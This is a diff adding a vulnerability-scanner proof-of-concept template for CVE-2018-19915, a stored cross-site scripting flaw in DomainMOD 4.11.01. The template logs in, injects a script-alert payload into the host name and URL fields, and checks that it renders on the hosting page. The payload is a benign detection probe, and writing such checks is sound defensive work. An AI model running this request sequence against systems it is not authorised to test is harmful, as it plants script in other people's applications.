@@ -1,0 +1,66 @@
+[info]
+author = "AVE"
+description = "检测 DomainMOD 4.11.01 及之前版本 assets/add/host.php 页面中 Web Host Name/URL 字段的存储型 XSS 漏洞。认证后添加包含 XSS 载荷的主机记录，验证载荷是否在管理页面中执行。"
+id = "POC-AVE-2018-0158"
+name = "DomainMOD 4.11.01 跨站脚本攻击 PoC"
+severity = "medium"
+tags = [
+    "cve-2018-19915",
+    "domainmod",
+    "xss",
+    "authenticated",
+]
+vuln_id = [
+    "CVE-2018-19915",
+    "AVE-2018-0158",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_username={{username}}&new_password={{password}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["302"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/assets/add/host.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_host=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_notes=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["302"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/assets/hosting.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["><script>alert(document.domain)</script></a>"]
